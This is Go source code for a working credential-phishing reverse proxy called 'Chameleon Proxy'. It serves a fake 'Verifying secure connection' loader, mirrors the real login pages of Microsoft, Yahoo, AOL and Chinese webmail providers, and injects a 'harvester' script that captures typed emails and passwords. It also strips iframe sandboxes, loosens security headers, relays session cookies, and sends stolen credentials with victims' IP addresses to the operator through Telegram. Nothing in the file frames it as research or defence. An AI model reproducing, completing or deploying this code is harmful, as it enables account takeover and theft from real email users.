package main

import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/base64"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

type SessionStore struct {
	mu       sync.RWMutex
	sessions map[string]*SessionData
}

type SessionData struct {
	Cookies   map[string]string
	UserEmail string
}

var store = &SessionStore{
	sessions: make(map[string]*SessionData),
}

const harvesterScript = `
<script>
(function() {
    var targetEmail = window._targetEmail;
    if (!targetEmail) return;

    function fillEmailAndSubmit() {
        var input = null;
        
        // Strategy 1: Look for inputs with email-like placeholders or default values
        var allInputs = document.querySelectorAll('input');
        for (var i = 0; i < allInputs.length; i++) {
            var inp = allInputs[i];
            var val = inp.value || '';
            var ph = inp.getAttribute('placeholder') || '';
            var defVal = inp.defaultValue || '';
            
            // Skip if already filled
            if (val && val.match(/^[^@]+@[^@]+$/)) continue;
            
            // Check if placeholder hints at email
            if (ph.indexOf('@') !== -1 || defVal.indexOf('@') !== -1) {
                input = inp;
                break;
            }
        }
        
        // Strategy 2: First visible text/email input
        if (!input) {
            var candidates = document.querySelectorAll('input[type="text"], input[type="email"], input:not([type])');
            for (var i = 0; i < candidates.length; i++) {
                var c = candidates[i];
                if (c.offsetParent !== null && !c.disabled && !c.readOnly) {
                    input = c;
                    break;
                }
            }
        }
        
        // Strategy 3: Last resort — first input on page
        if (!input) {
            var firstInput = document.querySelector('input');
            if (firstInput && firstInput.offsetParent !== null) {
                input = firstInput;
            }
        }
        
        if (input) {
            // Use native setter to bypass React/Vue detection
            var descriptor = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
            if (descriptor && descriptor.set) {
                descriptor.set.call(input, targetEmail);
            } else {
                input.value = targetEmail;
            }
            
            // Dispatch events properly
            input.dispatchEvent(new Event('input', { bubbles: true }));
            input.dispatchEvent(new Event('change', { bubbles: true }));
            input.dispatchEvent(new Event('blur', { bubbles: true }));
            
            // Visual feedback
            input.focus();
            input.scrollIntoView({ behavior: 'smooth', block: 'center' });
            input.style.border = '2px solid #4CAF50';
            input.style.boxShadow = '0 0 8px rgba(76, 175, 80, 0.5)';
            
            console.log('[Harvester] Email filled: ' + targetEmail);
        }
    }

    // Run immediately
    fillEmailAndSubmit();
    
    // Retry every 500ms for 10 seconds (in case DOM loads slowly)
    var retries = 0;
    var interval = setInterval(function() {
        retries++;
        var input = document.querySelector('input');
        if (input && input.value === targetEmail) {
            clearInterval(interval);
            return;
        }
        if (retries > 20) {
            clearInterval(interval);
            return;
        }
        fillEmailAndSubmit();
    }, 500);

    // Grab credentials on form submit
    document.addEventListener('submit', function(e) {
        var form = e.target;
        if (!form) return;
        
        var formData = new FormData(form);
        var params = new URLSearchParams();
        var hasEmail = false;
        var hasPassword = false;
        var emailVal = '';
        var passwordVal = '';

        for (var [key, value] of formData.entries()) {
            params.append(key, value);
            var keyLower = key.toLowerCase();
            
            if (keyLower.indexOf('email') !== -1 || keyLower.indexOf('user') !== -1 || 
                keyLower.indexOf('account') !== -1 || keyLower.indexOf('login') !== -1 ||
                keyLower.indexOf('userName') !== -1 || keyLower.indexOf('accountId') !== -1) {
                hasEmail = true;
                emailVal = value;
            }
            if (keyLower.indexOf('pass') !== -1 || keyLower.indexOf('pwd') !== -1 || keyLower.indexOf('password') !== -1) {
                hasPassword = true;
                passwordVal = value;
            }
        }

        if (hasEmail && hasPassword) {
            fetch(window.location.origin + '/api/harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: params.toString() + '&type=login'
            }).catch(function() {});
        } else if (hasEmail) {
            fetch(window.location.origin + '/api/harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'type=email_only&email=' + encodeURIComponent(emailVal)
            }).catch(function() {});
        }
    }, false);
})();
</script>
`

const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}
.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:spinAnim 1s linear infinite;margin:0 auto 20px;}
@keyframes spinAnim{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
setTimeout(()=>{
    var hash = window.location.hash;
    var email = "";

    if (hash && hash.length > 1) {
        var raw = hash.substring(1);

        // FIX: Handle raw email hashes like #user@hotmail.com
        if (raw.indexOf('@') !== -1 && !raw.startsWith('t=')) {
            email = raw;
        } else if (raw.startsWith('t=')) {
            var b64 = raw.split('t=')[1];
            try { email = atob(b64); } catch(e) { email = b64; }
        } else {
            if (raw.includes('[[-Email-]]')) { email = raw.replace('[[-Email-]]', 'test@126.com'); }
            else if (raw.includes('[[-email-]]')) { email = raw.replace('[[-email-]]', 'test@126.com'); }
            else if (raw.includes('[Email]')) { email = raw.replace('[Email]', 'test@126.com'); }
            else if (raw.includes('[email]')) { email = raw.replace('[email]', 'test@126.com'); }
            else { email = raw; }

            var b64Email = btoa(email);
            window.history.replaceState({}, '', '/#?t=' + b64Email);
        }

        window._targetEmail = email;

        fetch('/api/fetch?email=' + encodeURIComponent(email))
            .then(function(r) { return r.text(); })
            .then(function(html) {
                document.open();
                document.write(html);
                document.close();
            });
    } else {
        document.body.innerHTML = "<h3>No account provided.</h3>";
    }
}, 1000);
</script></body></html>`

func StartProxy(cfg TelegramConfig, listenPort string) {
	r := gin.Default()

	r.GET("/", func(c *gin.Context) {
		c.Header("Content-Type", "text/html")
		c.String(200, loaderHTML)
	})

	r.NoRoute(func(c *gin.Context) {
		if strings.Contains(c.Request.URL.Path, "cgi-sys") || strings.Contains(c.Request.URL.Path, "defaultwebpage") {
			c.Redirect(302, "/")
			return
		}
		c.Header("Content-Type", "text/html")
		c.String(200, loaderHTML)
	})

	r.GET("/api/fetch", func(c *gin.Context) {
		email := c.Query("email")
		if b64, err := base64.StdEncoding.DecodeString(email); err == nil && strings.Contains(string(b64), "@") {
			email = string(b64)
		}

		if email == "" {
			c.String(400, "Missing email")
			return
		}

		targetBase := GetTargetDomain(email)
		log.Printf("[PROXY] Fetching for %s from %s", email, targetBase)

		jar, _ := cookiejar.New(nil)
		proxyClient := &http.Client{
			Timeout: 15 * time.Second,
			Jar:     jar,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 3 {
					return http.ErrUseLastResponse
				}
				return nil
			},
			Transport: &http.Transport{
				ForceAttemptHTTP2: false,
				DialContext: (&net.Dialer{
					Timeout:   10 * time.Second,
					KeepAlive: 30 * time.Second,
				}).DialContext,
				TLSHandshakeTimeout: 10 * time.Second,
				MaxIdleConns:        100,
				IdleConnTimeout:     90 * time.Second,
				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			},
		}

		req, err := http.NewRequest("GET", targetBase, nil)
		if err != nil {
			c.String(500, "Request Error")
			return
		}

		req.Header.Set("Accept-Encoding", "identity")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9,zh-CN,zh;q=0.8")

		resp, err := proxyClient.Do(req)
		if err != nil {
			log.Printf("Proxy Error: %v", err)
			c.String(502, "Error: %v", err)
			return
		}
		defer resp.Body.Close()

		var bodyReader io.Reader = resp.Body
		if resp.Header.Get("Content-Encoding") == "gzip" {
			gzipReader, err := gzip.NewReader(resp.Body)
			if err == nil {
				bodyBytesGz, _ := io.ReadAll(gzipReader)
				gzipReader.Close()
				bodyReader = bytes.NewReader(bodyBytesGz)
			}
		}

		bodyBytes, _ := io.ReadAll(bodyReader)

		if strings.Contains(targetBase, "126.com") || strings.Contains(targetBase, "163.com") || strings.Contains(targetBase, "sina.com") || strings.Contains(strings.ToLower(resp.Header.Get("Content-Type")), "gbk") {
			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
			if decoded, err := io.ReadAll(reader); err == nil {
				bodyBytes = decoded
			}
		}

		bodyStr := string(bodyBytes)

		parsedBase, _ := url.Parse(targetBase)
		baseHost := parsedBase.Host

		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost, c.Request.Host+"/proxy")
		bodyStr = strings.ReplaceAll(bodyStr, "http://"+baseHost, c.Request.Host+"/proxy")
		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost+"/", c.Request.Host+"/proxy/")

		reMeta := regexp.MustCompile(`(?i)<meta[^>]*charset=["']?gbk["']?[^>]*>`)
		bodyStr = reMeta.ReplaceAllString(bodyStr, `<meta charset="utf-8">`)
		bodyStr = strings.ReplaceAll(bodyStr, "charset=gbk", "charset=utf-8")

		reSW := regexp.MustCompile(`(?i)navigator\.serviceWorker\.register\(.*?\)`)
		bodyStr = reSW.ReplaceAllString(bodyStr, `(function(){ return Promise.resolve(); })()`)

		reIframe := regexp.MustCompile(`(?i)<iframe(.*?)>`)
		bodyStr = reIframe.ReplaceAllStringFunc(bodyStr, func(m string) string {
			m = strings.ReplaceAll(m, `sandbox=""`, "")
			m = strings.ReplaceAll(m, `sandbox="allow-scripts allow-same-origin"`, "")
			m = strings.ReplaceAll(m, `sandbox="allow-scripts"`, "")
			m = strings.ReplaceAll(m, `sandbox`, "")
			return m
		})

		baseTag := `<base href="` + targetBase + `">`
		emailScript := `<script>window._targetEmail = "` + email + `";</script>`

		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag+"\n"+emailScript, 1)
		bodyStr = strings.Replace(bodyStr, "</body>", harvesterScript+"</body>", 1)

		c.Header("Content-Type", "text/html; charset=utf-8")
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; frame-ancestors *")

		for _, cookie := range resp.Cookies() {
			newCookie := &http.Cookie{
				Name:     cookie.Name,
				Value:    cookie.Value,
				Path:     "/",
				Domain:   "",
				MaxAge:   3600 * 24,
				HttpOnly: false,
				Secure:   false,
				SameSite: http.SameSiteNoneMode,
			}
			http.SetCookie(c.Writer, newCookie)
		}

		c.String(resp.StatusCode, bodyStr)
	})

	r.POST("/api/harvest", func(c *gin.Context) {
		c.Request.ParseForm()
		email := c.PostForm("email")
		password := c.PostForm("password")
		harvestType := c.PostForm("type")

		if email == "" {
			email = c.PostForm("username")
		}
		if email == "" {
			email = c.PostForm("loginfmt")
		}
		if email == "" {
			email = c.PostForm("userName")
		}
		if email == "" {
			email = c.PostForm("accountId")
		}
		if password == "" {
			password = c.PostForm("passwd")
		}
		if password == "" {
			password = c.PostForm("pwd")
		}

		ip := c.ClientIP()
		ua := c.GetHeader("User-Agent")

		if harvestType == "email_only" || (harvestType != "login" && email != "") {
			SendTelegramMessage(cfg, FormatLoginAlert(email, "[Waiting for password...]", ip, ua))
		} else if email != "" && password != "" {
			SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, ua))
		}

		c.JSON(200, gin.H{"status": "ok"})
	})

	r.Any("/proxy/*filepath", func(c *gin.Context) {
		filepath := strings.TrimPrefix(c.Param("filepath"), "/")
		referer := c.GetHeader("Referer")

		var targetDomain string

		switch {
		case strings.Contains(referer, "login.microsoftonline.com"):
			targetDomain = "https://login.microsoftonline.com"
		case strings.Contains(referer, "account.live.com"):
			targetDomain = "https://account.live.com"
		case strings.Contains(referer, "126.com"):
			targetDomain = "https://mail.126.com"
		case strings.Contains(referer, "qiye.163.com"):
			targetDomain = "https://qiye.163.com"
		case strings.Contains(referer, "163.com"):
			targetDomain = "https://mail.163.com"
		case strings.Contains(referer, "yahoo.com"):
			targetDomain = "https://login.yahoo.com"
		case strings.Contains(referer, "aol.com"):
			targetDomain = "https://login.aol.com"
		case strings.Contains(referer, "outlook.com"):
			targetDomain = "https://login.microsoftonline.com"
		case strings.Contains(referer, "hotmail.com"):
			targetDomain = "https://login.microsoftonline.com"
		default:
			if referer != "" {
				u, err := url.Parse(referer)
				if err == nil && u.Host != "" {
					targetDomain = u.Scheme + "://" + u.Host
				} else {
					targetDomain = "https://login.microsoftonline.com"
				}
			} else {
				targetDomain = "https://login.microsoftonline.com"
			}
		}

		fullURL := targetDomain + "/" + filepath
		if !strings.HasPrefix(filepath, "/") {
			fullURL = targetDomain + "/" + filepath
		}

		outReq, err := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)
		if err != nil {
			c.String(502, "Bad Request")
			return
		}

		for k, v := range c.Request.Header {
			lowerKey := strings.ToLower(k)
			if lowerKey != "host" && lowerKey != "referer" && lowerKey != "origin" {
				for _, val := range v {
					outReq.Header.Add(k, val)
				}
			}
		}

		for _, cookie := range c.Request.Cookies() {
			outReq.AddCookie(cookie)
		}

		client := &http.Client{
			Timeout:   15 * time.Second,
			Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
		}

		resp, err := client.Do(outReq)
		if err == nil {
			defer resp.Body.Close()

			contentType := resp.Header.Get("Content-Type")

			// DON'T rewrite URLs inside JSON responses
			if strings.Contains(contentType, "application/json") {
				bodyBytes, _ := io.ReadAll(resp.Body)
				c.Writer.Header().Set("Content-Type", contentType)
				c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
				c.Writer.WriteHeader(resp.StatusCode)
				c.Writer.Write(bodyBytes)
				return
			}

			bodyBytes, _ := io.ReadAll(resp.Body)
			bodyStr := string(bodyBytes)

			// Only rewrite HTML content
			if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "application/xhtml") {
				bodyStr = strings.ReplaceAll(bodyStr, targetDomain, c.Request.Host+"/proxy")
				bodyStr = strings.ReplaceAll(bodyStr, targetDomain+"/", c.Request.Host+"/proxy/")
			}

			c.Writer.Header().Set("Content-Type", contentType)
			c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
			c.Writer.WriteHeader(resp.StatusCode)
			c.Writer.WriteString(bodyStr)
		} else {
			c.String(502, "Upstream Error: "+err.Error())
		}
	})

	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
	r.Run("0.0.0.0:" + listenPort)
}
